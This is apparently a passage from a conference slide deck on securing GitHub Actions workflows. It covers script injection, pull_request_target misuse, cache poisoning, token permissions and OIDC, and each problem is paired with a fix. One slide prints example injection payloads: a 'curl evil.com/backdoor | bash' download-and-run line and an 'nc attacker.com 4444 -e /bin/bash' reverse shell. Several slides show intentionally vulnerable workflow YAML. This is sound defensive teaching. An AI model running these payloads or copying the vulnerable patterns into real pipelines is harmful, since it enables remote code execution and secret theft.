.trust-section li {
  margin-bottom: 0.4rem;
}

.trust-section code {
  background: rgba(0, 0, 0, 0.3);
  padding: 0.2rem 0.4rem;
  border-radius: 4px;
  font-size: 0.65rem;
}

.applies-to {
  background: rgba(244, 114, 182, 0.2);
  border-left: 3px solid #F472B6;
  padding: 0.5rem;
  border-radius: 4px;
  font-size: 0.55rem;
  color: #FBCFE8;
  margin-top: auto;
}
</style>

# 🔐 Trust Patterns for Third-Party Components

<div class="trust-container">

  <div class="trust-grid">
    <div class="trust-section">
      <h3>🎯 How to Trust</h3>
      <ul>
        <li><strong>Lock to tag</strong> - Mutable (<code>@v1.2.3</code>)</li>
        <li><strong>Pin to SHA</strong> - Immutable (<code>@a1b2c3d</code>)</li>
        <li><strong>Fork and own</strong> - Full control, your maintenance</li>
      </ul>
      <div class="applies-to">
        ⚠️ Lock third-party component (Docker, PyPI, NuGet ...)
      </div>
    </div>
    <div class="trust-section">
      <h3>🔍 What to Assess</h3>
      <ul>
        <li><strong>Maintenance</strong> - Active development?</li>
        <li><strong>Permissions</strong> - What access needed?</li>
        <li><strong>Dependencies</strong> - What does it use?</li>
        <li><strong>Reputation</strong> - Verified creator?</li>
        <li><strong>Security track record</strong> - Past issues?</li>
        <li><strong>Scan</strong> - Automated analysis</li>
      </ul>
      <div class="applies-to">
        💡 Use OSSF Scorecard
      </div>
    </div>
  </div>
</div>

<!-- Trust framework: tag vs SHA vs fork. SHA pinning is the default. Use OSSF Scorecard for third-party assessment. -->

---


<!--
_backgroundColor: #2D3748
_color: white
-->

<style scoped>
.code-container {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 80%;
}

.code-section {
  width: 70%;
}

.code-section pre {
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  padding: 2rem;
  margin: 0;
  font-size: 0.8rem;
}
</style>

# 🤔 What can go wrong? 

<div class="code-container">
  <div class="code-section">

```yaml
name: Discussion Create
on:
  discussion:
jobs:
  process:
    env:
      RUNNER_TRACKING_ID: 0
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v5
      - name: Handle Discussion
        run: echo ${{ github.event.discussion.body }}
```

  </div>
</div>

<!-- Ask the audience: spot the vulnerability. Answer: user input in run command → script injection. -->

---

<!--
_backgroundColor: #DC2626
_color: white
-->

<style scoped>
.problem-container {
  display: grid;
  grid-template-columns: 1fr 1fr;
  grid-template-rows: 1fr 1fr;
  gap: 1.5rem;
  height: 80%;
  padding: 0.2rem;
}

.attack-box {
  background: #2D1B1B;
  border-radius: 12px;
  padding: 1rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  display: flex;
  flex-direction: column;
}

.attack-box h3 {
  margin-top: 0;
  margin-bottom: 0.7rem;
  color: #FFD93D;
  font-size: 1.2rem;
}

.danger-box {
  background: rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  padding: 1rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  display: flex;
  flex-direction: column;
}

.danger-box h3 {
  margin-top: 0;
  margin-bottom: 0.72rem;
  color: #FFD93D;
  font-size: 1.2rem;
}

.attack-box pre {
  border: none !important;
}

.danger-box p,
.attack-box p {
  font-size: 0.75rem;
  margin: 0.5rem 0 0 0;
  line-height: 1.3;
  opacity: 0.9;
}

</style>

# 🔥 Script injection attack

<div class="problem-container">

<div class="attack-box">
<h3>💀 Malicious title</h3>

```bash
Hello"; curl evil.com/backdoor | bash; echo "
```

</div>

<div class="danger-box">
<h3>� What Happens</h3>

```bash
echo "Issue: Hello"; curl evil.com/backdoor | bash; echo ""
```
Commands executed on your runner!
</div>

<div class="attack-box">
<h3>💀 Malicious description</h3>

```bash
Test"; nc attacker.com 4444 -e /bin/bash; echo "
```

</div>

<div class="danger-box">
<h3>� What Happens</h3>

```bash
echo "Description: Test"; nc attacker.com 4444 -e /bin/bash; echo ""
```

Opens reverse shell to attacker!

</div>

</div>

<!-- Four attack vectors from one injection: reverse shell, secret theft, code manipulation, infra compromise. Powerful demo moment. -->

---

<!--
_backgroundColor: #00629F
_color: white
-->

<style scoped>
.attack-reference {
  position: absolute;
  top: 2rem;
  right: 2rem;
  background: rgba(0, 0, 0, 0.7);
  border: 2px solid #FCD34D;
  border-radius: 12px;
  padding: 0.8rem 1.2rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
  z-index: 15;
  transform: rotate(20deg);
}

.attack-reference p {
  margin: 0;
  font-size: 0.7rem;
  color: #FCD34D;
  font-weight: bold;
  text-align: center;
  line-height: 1.4;
}

.attack-reference .title {
  font-size: 0.6rem;
  color: #A0AEC0;
  margin-bottom: 0.2rem;
}
</style>

# Script injection


![bg left](../../assets/shared/img/injecton-attack.png)

### 🔐 Secret theft

### 💉 Malicious injection

### 🏗️ Compromised infrastructure

<div class="attack-reference">
  <p class="title">Part of</p>
  <p>Shai-Hulud 2.0<br/>Supply Chain Attack</p>
</div>

<!-- Script injection was the entry point for Shai-Hulud. Secrets stolen, code compromised, infra breached. -->

---

<!--
_backgroundColor: #2D3748
_color: white
-->

<style scoped>
.events-background {
  position: absolute;
  top: 0;
  left: 0;
  width: 95%;
  display: grid;
  grid-template-columns: repeat(3, auto);
  grid-template-rows: repeat(5, auto);
  gap: 0.15rem;
  padding: 1rem 1rem;
  opacity: 0.7;
  z-index: 1;
  align-content: space-evenly;
}

.event-box {
  background: rgba(255, 255, 255, 0.3);
  border-radius: 6px;
  padding: 0.7rem 0.2rem;
  font-size: 0.48rem;
  font-family: 'Courier New', monospace;
  display: flex;
  align-items: center;
  justify-content: center;
  text-align: center;
  word-break: break-all;
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
  line-height: 1.2;
  min-height: 3.2rem;
}

.warning-overlay {
  position: relative;
  z-index: 10;
  display: flex;
  align-items: center;
  justify-content: center;
  height: 100%;
}

.warning-card {
  background: linear-gradient(135deg, #DC2626 0%, #991B1B 100%);
  border: 4px solid #FCA5A5;
  border-radius: 16px;
  padding: 2rem 3rem;
  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
  transform: rotate(-10deg);
  max-width: 700px;
}

.warning-card h2 {
  margin: 0 0 0.8rem 0;
  font-size: 1.8rem;
  color: #FEF2F2;
  text-align: center;
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
}

.warning-card p {
  margin: 0;
  font-size: 1.3rem;
  color: #FEE2E2;
  text-align: center;
  line-height: 1.6;
}
</style>

<div class="events-background">
  <div class="event-box">github.event.issue.title</div>
  <div class="event-box">github.event.issue.body</div>
  <div class="event-box">github.event.pull_request.title</div>
  <div class="event-box">github.event.pull_request.body</div>
  <div class="event-box">github.event.comment.body</div>
  <div class="event-box">github.event.review.body</div>
  <div class="event-box">github.event.commits.*.message</div>
  <div class="event-box">github.event.head_commit.message</div>
  <div class="event-box">github.event.head_commit.author.email</div>
  <div class="event-box">github.event.commits.*.author.email</div>
  <div class="event-box">github.event.pull_request.head.ref</div>
  <div class="event-box">github.event.pull_request.head.label</div>
  <div class="event-box">github.head_ref</div>
  <div class="event-box">github.event.commits.*.author.name</div>
  <div class="event-box">github.event.head_commit.author.name</div>
</div>

<div class="warning-overlay">
  <div class="warning-card">
    <h2>⚠️ User input ⚠️</h2>
    <p>👉 Always sanitize user input 👈</p>
  </div>
</div>

<!-- All event fields shown are attacker-controlled. Never use directly in run commands. -->

---

<!--
_backgroundColor: #059669
_color: white
-->

<style scoped>
h1 {
  margin-bottom: 1.5rem;
}

.solution-content {
  display: flex;
  gap: 3rem;
  align-items: center;
  height: 75%;
}

.code-section {
  flex: 0 0 35%;
}

.code-section pre {
  margin: 0;
  font-size: 0.75rem;
  font-family: 'Courier New', monospace;
  line-height: 1.6;
  background: #1e1e1e;
  color: #d4d4d4;
  padding: 1.2rem;
  border-radius: 8px;
  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
}

.image-section {
  flex: 1;
}

.image-section img {
  width: 100%;
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
}
</style>

# ✅ Use intermediate environment variable

<div class="solution-content">
  <div class="code-section">
    <pre>env:
  TITLE: ${{ github.event.issue.title }}
steps:
  - run: echo "$TITLE"</pre>
  </div>
  <div class="image-section">
    <img src="../../assets/shared/img/user-input.png" alt="User Input Security">
  </div>
</div>

<!-- Fix: assign to env var first, then reference as shell variable. Prevents expression injection. -->

---

<!--
_backgroundColor: #059669
_color: white
-->

<style scoped>
pre {
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  font-size: 0.7rem;
}
</style>

# ✅ The safe way

```yaml
name: Discussion Create
on:
  discussion:
jobs:
  process:
    runs-on: self-hosted
    env:                                                    
      DISCUSSION_BODY: ${{ github.event.discussion.body }}.   # ← NEW
    steps:
      - uses: actions/checkout@v5
      - name: Handle Discussion
        run: echo $DISCUSSION_BODY                            # ← CHANGED
```

<!-- Same workflow, now safe. The DISCUSSION_BODY env var is set at shell level — no expression expansion in the run line. -->

---
<!--
_backgroundColor: #DC2626
_color: white
-->


<style scoped>
pre {
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  font-size: 0.7rem;
}
</style>

# 🤔 What can go wrong?

```yaml
name: Build PR
on:
  pull_request:
  pull_request_target:

jobs:
  build:
    if: ${{ startsWith(github.event_name, 'pull_request') }}  
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
      with:
        ref: ${{ github.event.pull_request.head.sha }}
        
    - name: Build
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}  
        API_KEY: ${{ secrets.API_KEY }} 
      run: echo "Building ${{ github.event.pull_request.base.ref }}"  
```

<!-- Ask: what happens on pull_request_target? Secrets exposed + untrusted code checkout + injection. Triple threat. -->

---
<!--
_backgroundColor: #DC2626
_color: white
-->

# 🤔 What can go wrong?
<style scoped>
pre {
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  font-size: 0.6rem;
}
</style>

```yaml
name: Build PR
on:
  pull_request:
  pull_request_target:  # ← DANGEROUS!

jobs:
  build:
    # Ineffective condition!
    if: ${{ startsWith(github.event_name, 'pull_request') }}  
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
      with:
        # untrusted code in trusted environment!
        ref: ${{ github.event.pull_request.head.sha }}
        
    - name: Build
      env:
        # Secrets exposed!
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}  
        API_KEY: ${{ secrets.API_KEY }} 
      # Injection!
      run: echo "Building ${{ github.event.pull_request.base.ref }}"  
```

<!-- Spot three issues: pull_request_target + checkout of PR head + secrets exposed + injection in run. This is a triple threat. -->

---

<!--
_backgroundColor: #B91C1C
_color: white
-->



# <!-- fit --> Nx "s1ngularity" attack


![bg left](../../assets/shared/img/nx.png)

### 🔐 Secret theft

### 👁️ Private source code exposed

<!-- Nx s1ngularity: real-world pull_request_target exploit. Secrets leaked, private repos exposed. Feb 2025. -->

---

<!--
_backgroundColor: #B91C1C
_color: white

-->

<style scoped>
.attack-container {
  display: grid;
  grid-template-columns: 2fr 3fr;
  gap: 2rem;
  height: 80%;
  align-items: center;
}

.attack-content {
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
}

.attack-point {
  background: rgba(255, 255, 255, 0.15);
  border-radius: 12px;
  padding: 1.5rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.attack-point p {
  margin: 0;
  font-size: 0.6rem;
  line-height: 3.22;
}

.attack-image {
  display: flex;
  justify-content: center;
  align-items: center;
}

.attack-image img {
  max-width: 100%;
  max-height: 100%;
  object-fit: contain;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
  border-radius: 12px;

}
</style>

# 🎯 Secrets and private sources

<div class="attack-container">
  <div class="attack-point">
      <p>🚀 1000s secrets leaked<p>
      <p>👥 480 users published private repositories</p>
      <p>🏷️ 500 repos from a company exposed</p>
  </div>

  
  <div class="attack-image">
    <img src="../../assets/shared/img/s1ngularity-aftermath.png" alt="Repository Takeover Attack" />
  </div>
</div>

<!-- 1000s of secrets, 480 users' private repos, 500 repos from one company. Massive real impact. -->

---


<!--
_backgroundColor: #DC2626
_color: white
-->

<style scoped>
.problem-explanation {
  display: grid;
  grid-template-columns: 1fr 1fr;
  grid-template-rows: 1fr;
  gap: 1.5rem;
  height: 85%;
  align-items: start;
}

.left-boxes {
  display: flex;
  flex-direction: column;
  gap: 2.0rem;
  height: 100%;
}

.danger-workflow {
  background: rgba(0, 0, 0, 0.3);
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.danger-workflow pre {
  border-radius: 8px;
  box-shadow: none;
  margin: 0;
  font-size: 0.75rem;
  background: rgba(0, 0, 0, 0.5);
}

.warning-box {
  background: rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  padding: 1.5rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
  height: 80%;
}

.warning-box h3 {
  margin-top: 0;
  margin-bottom: 1rem;
  color: #FEF3C7;
  font-size: 1.3rem;
}

.warning-box p {
  margin: 0;
  font-size: 1rem;
  line-height: 1.5;
}

.github-update {
  background: rgba(16, 185, 129, 0.2);
  border-radius: 8px;
  padding: 0.8rem 1rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
  flex: 0 0 auto;
}

.github-update h4 {
  margin: 0 0 0.4rem 0;
  color: #D1FAE5;
  font-size: 0.75rem;
}

.github-update p {
  margin: 0;
  font-size: 0.6rem;
  line-height: 1.4;
  color: #D1FAE5;
}

.highlight {
  padding: 0.2rem 0.4rem;
  border-radius: 4px;
  color: #000;
  font-weight: bold;
}
</style>

# 🔥 The `pull_request_target` Problem - Still Real

<div class="problem-explanation">
  <div class="left-boxes">
    <div class="danger-workflow">

```yaml
# DON'T DO THIS!
on: pull_request_target  # ← Runs in trusted context

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
      with:
        # ← Untrusted code!
        ref: ${{ github.event.pull_request.head.sha }} 
```

</div>
    <div class="github-update">
      <h4>✨ GitHub Update (Dec 8, 2025)</h4>
      <p><code>pull_request_target</code> now always uses the default branch for workflow source, preventing outdated workflows from being executed. <strong>Note: This only limits the attack surface but doesn't eliminate the risk.</strong></p>
    </div>
  </div>
  <div class="warning-box">
    <h3>⚠️ Critical Security Issue</h3>
    <p>You are giving <span class="highlight">write permissions and secrets access</span> to untrusted code. Any building step, script execution, or action call could be used to <span class="highlight">compromise the entire repository</span></p>
  </div>
</div>

<!-- pull_request_target runs in trusted context with secrets. Checking out PR head = running untrusted code with full access. GitHub's Dec 2025 fix helps but doesn't eliminate risk. -->


---

# 🎯 Attack Vectors: Six Real Exploits

**All exploited: `pull_request_target` + untrusted input**

<!--
_backgroundColor: #DC2626
_color: white
-->

<style scoped>
.sticker-danger {
  position: absolute;
  top: 50px;
  right: 30px;
  background: linear-gradient(135deg, #DC2626, #991B1B);
  border: 2px solid #FCA5A5;
  padding: 0.8rem 1.2rem;
  border-radius: 8px;
  font-size: 0.85rem;
  color: #FEF3C7;
  font-weight: bold;
  white-space: nowrap;
  transform: rotate(15deg);
  box-shadow: 0 8px 20px rgba(220, 38, 38, 0.4);
  z-index: 100;
}

.attack-boxes-grid {
  display: grid;
  grid-template-columns: 1fr 1fr 1fr;
  gap: 1.2rem;
  margin-top: 1rem;
}

.attack-box {
  background: rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  padding: 1.1rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  display: flex;
  flex-direction: column;
  gap: 0.2rem;
}

.attack-box:hover {
  background: rgba(255, 255, 255, 0.15);
  box-shadow: 0 8px 28px rgba(220, 38, 38, 0.25);
  transform: translateY(-2px);
}

.box-title {
  font-size: 0.8rem;
  font-weight: bold;
  color: #FCA5A5;
}

.box-method {
  font-size: 0.65rem;
  color: #FED7AA;
  font-weight: 600;
}

.box-impact {
  font-size: 0.55rem;
  color: #E5E7EB;
  line-height: 1.3;
}
</style>

<div class="sticker-danger">Hackerbot-Claw • THIS WEEK</div>

<div class="attack-boxes-grid">
  <div class="attack-box">
    <div class="box-title">awesome-go (140k)</div>
    <div class="box-method">Go init() poisoning</div>
    <div class="box-impact">Auto-execute on import, steal GITHUB_TOKEN, exfiltrate private repos</div>
  </div>

  <div class="attack-box">
    <div class="box-title">trivy (25k)</div>
    <div class="box-method">Action injection</div>
    <div class="box-impact">Inject malicious payload in workflow steps, delete releases, poison artifacts</div>
  </div>

  <div class="attack-box">
    <div class="box-title">RustPython (20k)</div>
    <div class="box-method">Branch name injection</div>
    <div class="box-impact">Base64 in git push, command substitution, partial code execution</div>
  </div>

  <div class="attack-box">
    <div class="box-title">Microsoft AI Agent</div>
    <div class="box-method">Branch name injection</div>
    <div class="box-impact">Payload in bash eval from git ref, RCE with full repository permissions</div>
  </div>

  <div class="attack-box">
    <div class="box-title">DataDog IaC Scanner</div>
    <div class="box-method">Filename injection</div>
    <div class="box-impact">Base64 payload in filenames, trigger build-time code execution</div>
  </div>

  <div class="attack-box">
    <div class="box-title">project-akri</div>
    <div class="box-method">Script injection</div>
    <div class="box-impact">Shell command injection in build scripts, execute arbitrary code with repo access</div>
  </div>
</div>

_<span style="font-size: 0.68rem; color: #FEF3C7; font-weight: 500;">Source: StepSecurity.io (1 Mar 2026)</span>_

---

<style scoped>
.cache-problem-container {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 2rem;
  height: 85%;
  align-items: center;
}

.cache-image {
  display: flex;
  justify-content: center;
  align-items: center;
}

.cache-image img {
  max-width: 90%;
  max-height: 90%;
  object-fit: contain;
  border-radius: 12px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
}

.cache-explanation {
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
}

.cache-warning {
  background: rgba(255, 255, 255, 0.15);
  border-radius: 12px;
  padding: 1.2rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.cache-warning h3 {
  margin: 0 0 0.8rem 0;
  color: #FEF3C7;
  font-size: 0.96rem;
}

.cache-warning ul {
  margin: 0;
  padding-left: 1.5rem;
  font-size: 0.58rem;
  line-height: 1.8;
}

.cache-warning li {
  margin-bottom: 0.4rem;
}

.cache-danger {
  background: rgba(220, 38, 38, 0.3);
  border-radius: 8px;
  padding: 1rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.cache-danger h4 {
  margin: 0 0 0.5rem 0;
  color: #FEF3C7;
  font-size: 0.8rem;
}

.cache-danger p {
  margin: 0;
  font-size: 0.64rem;
  line-height: 1.5;
  color: #FEE2E2;
}
</style>

# 🗄️ Cache Poisoning Risk

<div class="cache-problem-container">
  <div class="cache-image">
    <img src="../../assets/shared/img/cache.png" alt="Cache Poisoning Attack" />
  </div>
  
  <div class="cache-explanation">
    <div class="cache-warning">
      <h3>⚠️ Caches Are Shared</h3>
      <ul>
        <li>Pull requests can access caches from the <strong>base branch</strong></li>
        <li>Attackers can create poisoned caches that <strong>persist</strong> and affect subsequent builds</li>
      </ul>
    </div>
    <div class="cache-danger">
      <h4>🔥 Critical: Release Workflows</h4>
      <p><strong>Never rely on caches for security-sensitive workflows</strong> like building releases or deploying to production. A poisoned cache can inject malicious code into your build artifacts.</p>
    </div>
  </div>
</div>

<!-- Caches persist across runs. Attacker poisons cache on a PR, subsequent builds on main pick it up. Never trust cache in release pipelines. -->

---

<!--
_backgroundColor: #DC2626
_color: white
-->

<style scoped>
.problem-container {
  display: grid;
  grid-template-columns: 2fr 3fr;
  gap: 1rem;
  height: 80%;
  align-items: start;
}

.code {
  background: rgba(0, 0, 0, 0.3);
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.code pre {
  border-radius: 8px;
  box-shadow: none;
  margin: 0;
  font-size: 0.7rem;
  background: rgba(0, 0, 0, 0.5);
}

.explanation {
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
}

.danger-point {
  background: rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  padding: 1.2rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.danger-point h4 {
  margin-top: 0;
  margin-bottom: 0.8rem;
  color: #FEF3C7;
  font-size: 1.1rem;
}

.danger-point p {
  margin: 0;
  font-size: 0.9rem;
  line-height: 1.4;
}

.token-highlight {
  background: rgba(255, 255, 0, 0.3);
  padding: 0.2rem 0.4rem;
  border-radius: 4px;
  color: #000;
  font-weight: bold;
}
</style>

# 🔥 Implicit GitHub token problem

<div class="problem-container">
  <div class="code">

```yaml
name: Deploy Package

on: [push]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    
    - name: Publish to registry
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      run: |
        npm publish
        git tag v1.0.0
        git push --tags
```

  </div>
  
  <div class="explanation">
    <div class="danger-point">
      <h4>🔑 Implicit Broad Access</h4>
      <p>GitHub injects a short lived token into your workflow. Default permission depending on settings.</p>
    </div>
    <div class="danger-point">
      <h4>💀 What Can Go Wrong</h4>
      <p>Malicious code can modify your repository, create releases, delete branches, access secrets, and compromise your entire codebase.</p>
    </div>
  </div>
</div>


<!-- Default GITHUB_TOKEN has write-all permissions. If compromised, attacker gets full repo access. Always set permissions explicitly. -->

---

<!--
_backgroundColor: #059669
_color: white
-->

<style scoped>
.token-problem-container {
  display: grid;
  grid-template-columns: 2fr 3fr;
  gap: 1rem;
  height: 80%;
  align-items: start;
}

.secure-code {
  background: rgba(0, 0, 0, 0.3);
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.secure-code pre {
  border-radius: 8px;
  box-shadow: none;
  margin: 0;
  font-size: 0.7rem;
  background: rgba(0, 0, 0, 0.5);
}

.solution-explanation {
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
}

.solution-point {
  background: rgba(255, 255, 255, 0.15);
  border-radius: 12px;
  padding: 1.2rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.solution-point h4 {
  margin-top: 0;
  margin-bottom: 0.8rem;
  color: #F0FDF4;
  font-size: 1.1rem;
}

.solution-point p {
  margin: 0;
  font-size: 0.9rem;
  line-height: 1.4;
}

.token-highlight {
  background: rgba(16, 185, 129, 0.3);
  padding: 0.2rem 0.4rem;
  border-radius: 4px;
  color: #000;
  font-weight: bold;
}
</style>

# ✅ Explicit GitHub token permissions

<div class="token-problem-container">
  <div class="secure-code">

```yaml
name: Deploy Package

on: [push]

permissions: {} # no permissions by default
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: read # read-only access to repository
    steps:
    - uses: actions/checkout@v4
    
    - name: Publish to registry
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      run: |
        npm publish
        git tag v1.0.0
        git push --tags # fails - no write permissions!
```

  </div>
  
  <div class="solution-explanation">
    <div class="solution-point">
      <h4>🛡️ Principle of Least Privilege</h4>
      <p>Default to <span class="token-highlight">no permissions</span> and grant minimal required access on job level.</p>
    </div>
    <div class="solution-point">
      <h4>✅ Better Security</h4>
      <p>Failed operations are better than compromised repositories. Add specific permissions only when needed.</p>
    </div>
  </div>
</div>


<!-- Set permissions: {} at workflow level. Add specific permissions per job. Failed is better than compromised. -->

---

<!--
_backgroundColor: #DC2626
_color: white
-->

<style scoped>
.problem-container {
  display: grid;
  grid-template-columns: 6fr 8fr;
  gap: 1.4rem;
  height: 80%;
  align-items: start;
}

.image-container {
  background: rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
  display: flex;
  align-items: center;
  justify-content: center;
}

.img {
  max-width: 100%;
  max-height: 100%;
  object-fit: contain;
  border-radius: 12px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
}

.code {
  background: rgba(0, 0, 0, 0.3);
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.code pre {
  border-radius: 8px;
  box-shadow: none;
  margin: 0;
  font-size: 0.7rem;
  background: rgba(0, 0, 0, 0.5);
}

.explanation {
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
}

.danger-point {
  background: rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  padding: 0.5rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.danger-point h4 {
  margin-top: 0.5rem;
  margin-bottom: 0.5rem;
  color: #FEF3C7;
  font-size: 1.0rem;
  line-height: 1.5rem;
}


.token-highlight {
  background: rgba(255, 255, 0, 0.3);
  padding: 0.2rem 0.4rem;
  border-radius: 4px;
  color: #000;
  font-weight: bold;
}
</style>

# 🔥 The problem with long-lived secrets

<div class="problem-container">
  
  <div class="image-container">
    <img src="../../assets/shared/img/long-lived.png" class="img" />
  </div>

  <div class="explanation">
    <div class="danger-point">
      <h4>📋 Rotate to expire</h4>
      <h4>💥 High Blast Radius</h4>
    </div>
    <div class="code">

```yaml
jobs:
  deploy-with-keys:
    runs-on: ubuntu-latest
    environment: demo

    steps:
      - name: Checkout code
        uses: actions/checkout@...

      - name: Set up AWS
        uses: aws-actions/configure-aws-credentials@...
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
```
  </div>
  </div>

</div>

<!-- Long-lived AWS keys in secrets: if leaked, attacker has permanent access. These never expire unless rotated. -->

---

<!--
_backgroundColor: #059669
_color: white
-->



<style scoped>
.slide-container {
  display: flex;
  gap: 1rem;
  height: 80%;
}

.left-section {
  flex: 0 0 35%;
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.image-container {
  flex: 1;
  background: rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
  display: flex;
  align-items: center;
  justify-content: center;
}

.img {
  max-width: 100%;
  max-height: 100%;
  object-fit: contain;
  border-radius: 12px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
}

.tech-container {
  flex: 0 0 auto;
  background: rgba(255, 255, 255, 0.15);
  border-radius: 12px;
  padding: 0.5rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.tech-container h4 {
  margin: 0 0 0.3rem 0;
  color: #F0FDF4;
  font-size: 0.7rem;
}

.right-section {
  flex: 1;
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.code {
  flex: 1;
  background: rgba(0, 0, 0, 0.3);
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.code pre {
  border-radius: 8px;
  box-shadow: none;
  margin: 0;
  font-size: 0.7rem;
  background: rgba(0, 0, 0, 0.5);
}
</style>



# ✅ OIDC short-lived secrets

<div class="slide-container">
  <div class="left-section">
    <div class="image-container">
      <img src="../../assets/shared/img/gh-oidc-aws.png" class="img" />
    </div>
    <div class="tech-container">
      <h4>⏰ Short-lived tokens)</h4>
      <h4>🔄 Automatic rotation per run</h4>
    </div>
  </div>
  
  <div class="right-section">
    <div class="code">

```yaml
jobs:
  deploy-with-oidc:
    runs-on: ubuntu-latest
    environment: demo
    permissions:
      id-token: write

    steps:
      - name: Configure AWS with OIDC
        uses: aws-actions/configure-aws-credentials@...
        with:
          role-to-assume: arn:aws:iam::123:role/minimal-access-role
```

  </div>
  <div class="code">

```json
// AWS Trust Policy

"Statement": [{
  ...
  "Principal": {
      "Federated": "<arn:aws:iam::123:oidc-provider/token.actions.githubusercontent.com>"
  },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
      "StringEquals": {
          "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:more-conditions"],
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
  ...
```
  </div>
  </div>
</div>

<!-- OIDC: short-lived tokens, no stored secrets, cloud provider validates claims. Much safer than long-lived keys. -->

---

# ✅ Keep secrets safe

<!--
_backgroundColor: #059669
_color: white
-->

<style scoped>
.secrets-container {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 2rem;
  height: 85%;
  padding: 0rem;
}

.left-column, .right-column {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.text-box {
  background: rgba(255, 255, 255, 0.15);
  border-radius: 12px;
  padding: 0.5rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
  flex: 0 0 auto;
}

.text-box h3 {
  margin: 0 0 0.8rem 0;
  color: #F0FDF4;
  font-size: 1.1rem;
}

.text-box ul {
  margin: 0;
  padding-left: 1.2rem;
  font-size: 0.6rem;
  line-height: 1.4;
  color: #D1FAE5;
}

.text-box li {
  margin-bottom: 0.3rem;
}

.code-block {
  background: rgba(0, 0, 0, 0.6);
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
  flex: 1;
  padding: 1rem;
}

.code-block pre {
  border-radius: 8px;
  box-shadow: none;
  margin: 0.5rem 0;
  font-size: 0.6rem;
  background: rgba(0, 0, 0, 0.4);
  padding: 1rem;
  overflow: auto;
}

.example-label {
  font-size: 0.5rem;
  font-weight: bold;
  margin: 0;
  padding: 0.2rem 0.4rem;
  border-radius: 4px;
  display: inline-block;
}

.code-example {
  position: relative;
  margin: 0;
}

.code-example p.example-label {
  position: absolute;
  top: -1.8rem !important;
  right: 0.15rem !important;
  z-index: 10;
  font-size: 0.45rem;
  font-weight: bold;
  margin: 0;
  padding: 0.3rem 0.6rem;
  border-radius: 4px;
  box-shadow: 0 3px 8px rgba(0, 0, 0, 0.4);
  transform: rotate(12deg);
}

.code-example pre {
  margin: 0;
  position: relative;
}

